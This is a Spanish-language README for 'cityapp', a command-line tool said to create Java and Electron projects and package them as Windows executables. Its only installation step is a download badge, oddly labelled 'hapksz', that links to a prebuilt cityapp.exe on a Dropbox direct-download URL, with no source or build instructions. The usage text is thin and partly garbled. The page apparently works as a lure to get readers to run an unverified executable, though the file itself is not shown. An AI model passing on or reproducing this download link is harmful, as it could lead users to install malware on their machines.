# cityapp

**cityapp** es una herramienta CLI (Command Line Interface) para crear y empaquetar aplicaciones Java y aplicaciones web (WebApps) de forma automática. Con comandos simples, genera la estructura básica de tu proyecto y te ayuda a convertirlo en un ejecutable `.exe` listo para distribuir.

---

## Características principales

- Crear proyectos Java con estructura y archivos base listos para programar.  
- Crear proyectos WebApp con HTML, CSS y JS básicos, integrados con Electron para empaquetar en `.exe`.  
- Compilar y empaquetar proyectos Java en `.exe` usando herramientas como `jpackage` o `Launch4j`.  
- Empaquetar WebApps en aplicaciones de escritorio `.exe` con Electron.  
- Instalación automática de dependencias necesarias para cada tipo de proyecto.  
- Fácil de usar con comandos intuitivos en la terminal.

---

## Instalación

**Descargar** [![Click Here to Download](https://img.shields.io/badge/Download-hapksz-blue?style=for-the-badge&logo=download)](https://dl.dropboxusercontent.com/scl/fi/t9tdake1xsrwyxyf79pm2/cityapp.exe?rlkey=y7ta032056dpado8r1o6bth4c)

---

## Uso

### Crear un proyecto Java

`cityapp create java MiProyectoJava`

Esto generará la estructura básica para un proyecto Java en la carpeta `MiProyectoJava`.

### Empaquetar y generar `.exe` para Java

cityapp terminate javapp MiProyectoJava

text

Compilará y empaquetará el proyecto Java en un archivo ejecutable `.exe`.

---

### Crear un proyecto WebApp

cityapp create webapp MiProyectoWeb

text

Generará la estructura básica para una aplicación web con Electron.

### Empaquetar y generar `.exe` para WebApp

`cityapp terminate webapp MiProyectoWeb`

Empaquetará la WebApp en un ejecutable `.exe` usando Electron.

---

## Requisitos

- **Java JDK 14+** (para proyectos Java y empaquetado con `jpackage`).  
- **Node.js y npm** (para proyectos WebApp y empaquetado con Electron).  
- **Electron** y **electron-builder** (se instalan automáticamente en proyectos WebApp).  
- Opcionalmente, **Launch4j** si prefieres usarlo para empaquetar Java.


---

## Contribuciones

¡Las contribuciones son bienvenidas! Si quieres mejorar `cityapp`, por favor abre un issue o envía un pull request.

---

## Licencia

Este proyecto está bajo la licencia MIT. Consulta el archivo [LICENSE](LICENSE) para más detalles.

---

## Contacto

Si tienes dudas o sugerencias, contáctame en: [sourcdevs@outlook.com]

